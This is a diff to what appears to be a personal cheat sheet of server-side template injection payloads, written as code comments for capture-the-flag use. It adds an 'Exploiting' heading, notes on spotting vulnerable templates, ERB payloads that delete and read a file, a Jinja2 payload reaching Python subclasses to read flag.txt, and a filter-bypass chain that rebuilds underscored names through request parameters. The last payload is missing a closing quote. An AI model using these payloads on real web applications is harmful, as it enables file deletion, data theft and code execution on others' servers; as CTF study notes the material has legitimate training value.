@@ -1,5 +1,8 @@
+// Server Side Template Injection
+//! Exploiting
 //* test
 // ${{<%[%'"}}%\
+// if this return an error it might be vulnerable
 //* ERB
 // <%= File.delete("morale.txt") %>
 // <%= File.read("morale.txt") %>
@@ -46,12 +49,13 @@
 //* python jinja2
 // {{''.__class__.__mro__[2].__subclasses__()[40] ('flag.txt').read()}}
 // if it didn't work try https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
-//? filter
-// us &filtered=*
+//* filter bypass in python
+// add the parameter  &filtered=*
 // then request.args.filtered will be replace with *
 // {{ object|attr(attribute_name) }} <==> {{ object.attribute_name }}
 // for add _ to the name we can use ([request.args.filtered * 2 , "class" , request.args.filtered * 2] | join ) <==> __class__
 
+// we end up with this : 
 // {{ ((''|attr([request.args.underscore * 2 , "class" , request.args.underscore * 2] | join) |
 // attr([request.args.underscore * 2 , "mro" , request.args.underscore * 2] | join))[2]
 // | attr([request.args.underscore * 2 , "subclasses" , request.args.underscore * 2] | join)())[40]('flag.txt).read()}}
